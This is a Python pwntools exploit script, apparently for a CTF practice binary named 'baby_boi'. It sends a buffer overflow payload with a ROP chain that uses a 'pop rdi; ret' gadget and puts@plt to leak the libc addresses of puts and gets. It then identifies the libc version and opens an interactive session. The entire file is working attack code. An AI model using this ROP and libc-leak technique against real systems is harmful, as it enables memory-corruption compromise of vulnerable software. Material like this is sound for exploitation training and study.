import thenight
from pwn import *

# Establish the target
target = process('./baby_boi')
elf = ELF('baby_boi')
#gdb.attach(target)

# Our Rop Gadget to `pop rdi; ret`
popRdi = p64(0x400793)

# plt address of puts
puts = p64(elf.symbols["puts"])

# Parse out some output
print(target.recvuntil("ere I am: "))
target.recvline()

# Form our payload to leak libc address of puts and get by calling the plt address of puts twice, with it's argument being the got address of puts and then gets
payload = b""
payload += b"0"*0x28         
payload += popRdi                    # Pop rdi ; ret
payload += p64(elf.got["puts"])        # Got address for puts
payload += puts                     # Plt address puts
payload += popRdi                    # Pop rdi ; ret
payload += p64(elf.got["gets"])     # Got address for get
payload += puts                     # Plt address puts

# Send the payload
target.sendline(payload)

# Scan in the libc infoleaks
leak0 = target.recvline().strip(b"\n")
putsLibc = u64(leak0 + b"\x00"*(8-len(leak0)))

leak1 = target.recvline().strip(b"\n")
getsLibc = u64(leak1 + b"\x00"*(8-len(leak1)))

print("puts libc: %s" % hex(putsLibc))
print("gets libc: %s" % hex(getsLibc))

# Pass the leaks to The Night to figure out
thenight.find_libc_version("puts", putsLibc, "gets", getsLibc)

target.interactive()
